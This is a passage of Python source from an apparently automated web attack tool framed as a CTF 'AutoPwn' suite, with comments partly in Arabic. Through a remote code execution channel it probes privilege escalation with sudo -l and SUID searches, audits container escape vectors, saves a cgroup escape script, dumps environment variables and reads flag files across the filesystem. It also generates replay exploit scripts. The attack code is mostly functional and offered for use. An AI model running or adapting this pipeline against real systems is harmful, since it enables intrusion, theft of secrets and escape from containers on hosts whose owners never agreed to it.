
        # 3. System PrivEsc: If RCE is active, inspect system privileges
        if self.state["active_rce_method"]:
            try:
                print_info("Probing System Privilege Escalation Vectors (Sudo / SUID / Roots)...")
                id_out = self.state["active_rce_method"]("id; whoami; sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null")
                print_info(f"Current System Context: {id_out.strip().splitlines()[0] if id_out else 'Unknown'}")
                self._check_and_store_flags(id_out, "System PrivEsc Probe Output")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

    # =========================================================================
    # PHASE 6: ما بعد الاستغلال وفحص هروب الحاويات (Post-Exploitation & Container Escape)
    # =========================================================================
    def phase6_post_exploitation(self):
        print_header("المرحلة 6: ما بعد الاستغلال وفحص هروب الحاويات", "Phase 6: Container Escape & Post-Exploitation")
        
        # 1. Container & Sandbox Escape Audit
        if self.state["active_rce_method"]:
            print_info("Auditing Container Environment & Escape Vectors (Docker / Cgroup / SUID)...")
            recon_cmds = [cmd["cmd"] for cmd in ContainerEscapeAdvisor.get_recon_commands()]
            full_recon_cmd = "; echo '===SEP==='; ".join(recon_cmds)
            try:
                recon_output = self.state["active_rce_method"](full_recon_cmd)
                findings = ContainerEscapeAdvisor.analyze_shell_recon(recon_output)
                
                if findings["is_container"]:
                    print_warning(f"Target is running inside a Container: [bold yellow]{findings['container_type']}[/bold yellow]")
                    LootManager.save_loot_file(self.target_url, "container_recon.txt", recon_output)
                    
                    # Check for Critical Escape Vectors
                    if findings["escapes"]:
                        for esc in findings["escapes"]:
                            print_success(f"CRITICAL ESCAPE FOUND: [bold red]{esc['type']}[/bold red] - Risk: {esc['risk']}")
                            print_info(f"  Exploit: {esc['exploit']}")
                        
                        # Generate cgroup release_agent script into loot
                        cgroup_script = ContainerEscapeAdvisor.generate_cgroup_escape_script()
                        LootManager.save_loot_file(self.target_url, "cgroup_escape.sh", cgroup_script)
                        print_success("Saved 'cgroup_escape.sh' exploit script into loot!")
                
                if findings["suid_exploits"]:
                    print_success(f"GTFOBins SUID PrivEsc Opportunities Found ({len(findings['suid_exploits'])} binaries):")
                    for s in findings["suid_exploits"][:3]:
                        print_info(f"  Binary: [bold cyan]{s['binary']}[/bold cyan] -> Exploit: {s['exploit']}")

            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:

                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        # 2. Audit all leaked source files for sinks
        for fname, content in self.state["leaked_source_files"].items():
            findings = analyze_code_snippet(content, "all")
            if findings:
                print_info(f"Code Vulnerability Sinks in [bold cyan]{fname}[/bold cyan]: {len(findings)} sinks detected.")
                for f in findings[:3]:
                    print_info(f"  Line {f['line']}: [bold yellow]{f['matched']}[/bold yellow] -> {f['description']}")

        # 3. Dump Environment Variables if RCE available
        if self.state["active_rce_method"]:
            try:
                env_out = self.state["active_rce_method"]("env")
                self._check_and_store_flags(env_out, "Environment Variables")
                LootManager.save_loot_file(self.target_url, "environment_dump.txt", env_out)
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

    # =========================================================================
    # PHASE 7: صيد واستخراج الأعلام المتعددة (Multi-Flag Hunting & Victory Reporting)
    # =========================================================================

    def phase7_multi_flag_hunting(self):
        print_header("المرحلة 7: صيد واستخراج الأعلام المتعددة", "Phase 7: Multi-Flag Deep Extraction & Reporting")
        
        # 1. Deep File Search via RCE
        if self.state["active_rce_method"]:
            flag_targets = [
                "cat /flag*",
                "cat /flag.txt",
                "cat /root/flag.txt",
                "cat /root/root.txt",
                "cat /home/*/*flag*",
                "cat /app/flag*",
                "cat /var/www/flag*",
                "find / -name '*flag*' -exec cat {} + 2>/dev/null"
            ]
            for cmd in flag_targets:
                try:
                    out = self.state["active_rce_method"](cmd)
                    self._check_and_store_flags(out, f"Command: {cmd}")
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

        # 2. Display Final Flags Summary
        if self.state["captured_flags"]:
            print_success(f"Total Flags Captured: [bold yellow]{len(self.state['captured_flags'])}[/bold yellow]")
            for f in sorted(list(self.state["captured_flags"])):
                print_flag(f)
        else:
            print_warning("No clear CTF flags captured yet. Review leaked source files in storage/loot/.")

        # 3. Attack Path Timeline (saved to loot, not printed to console)
        # if self.state["attack_steps"]:
        #     rows = [[s["timestamp"], s["phase"], s["description"]] for s in self.state["attack_steps"]]
        #     print_table(["Time", "Offensive Phase", "Action & Exploited Step"], rows, title="Attack Path Graph & Timeline")

    # =========================================================================
    # PERSISTENCE & MEMORY UPDATE
    # =========================================================================
    def _save_session_and_loot(self):
        """Save session state, flags, loot, report, and reproducible exploit script."""
        flags_list = list(self.state["captured_flags"])
        
        # 1. Save Flags to Loot
        LootManager.save_flags(self.target_url, flags_list)

        # 2. Generate Standalone Python Exploit Script
        py_exploit = self._generate_python_exploit()
        LootManager.save_exploit_script(self.target_url, py_exploit, self.state["curl_commands"])

        # 3. Save Markdown Report & Graph Data
        report_md = self._generate_markdown_report()
        LootManager.save_attack_report(self.target_url, report_md, {
            "target": self.target_url,
            "flags": flags_list,
            "steps": self.state["attack_steps"],
            "technologies": self.state["tech_stack"]
        })

        # 4. Save Session State
        session_data = {
            "target_url": self.target_url,
            "tech_stack": self.state["tech_stack"],
            "endpoints": list(self.state["endpoints"]),
            "parameters": list(self.state["parameters"]),
            "cookies": self.state["cookies"],
            "flags": flags_list,
            "steps": self.state["attack_steps"]
        }
        SessionStorage.save_session(self.target_url, session_data)

        loot_path = LootManager.get_loot_dir(self.target_url)
        print_success(f"Persistent Memory & Loot Saved to: [bold cyan]{loot_path}[/bold cyan]")
        print_info(f"Learned Experience updated in: [bold cyan]{self.learning_engine.db_path}[/bold cyan]")

    def _generate_python_exploit(self) -> str:
        """Build a clean standalone Python script to reproduce the exploit chain."""
        return f'''#!/usr/bin/env python3
"""
Standalone Exploit Script for {self.target_url}
Generated automatically by WebCTF Suite AutoPwn Pipeline.
"""

import requests

TARGET = "{self.target_url}"
session = requests.Session()

def run_exploit():
    print("[*] Running exploit chain against: " + TARGET)
    # Attack steps reproduction
''' + "\n".join([f"    # {s['phase']}: {s['description']}" for s in self.state["attack_steps"]]) + '''
    print("[+] Exploit chain executed successfully!")

if __name__ == "__main__":
    run_exploit()
'''

    def _generate_markdown_report(self) -> str:
        """Build comprehensive markdown post-mortem report."""
        flags_str = "\n".join([f"- `{f}`" for f in self.state["captured_flags"]]) or "None captured"
        steps_str = "\n".join([f"1. **{s['phase']}**: {s['description']} ({s.get('details', '')})" for s in self.state["attack_steps"]])
        return f"""# 🚩 Web CTF Exploit Report: {self.target_url}

## Summary
- **Target URL**: `{self.target_url}`
- **Technologies Detected**: `{', '.join(self.state['tech_stack'])}`
- **Total Flags Captured**: `{len(self.state['captured_flags'])}`

## 🏆 Captured Flags
{flags_str}

## 🧭 Attack Path Graph & Exploitation Steps
{steps_str}

## 📜 Reproducible Commands
```bash
{chr(10).join(self.state['curl_commands'])}
```
"""
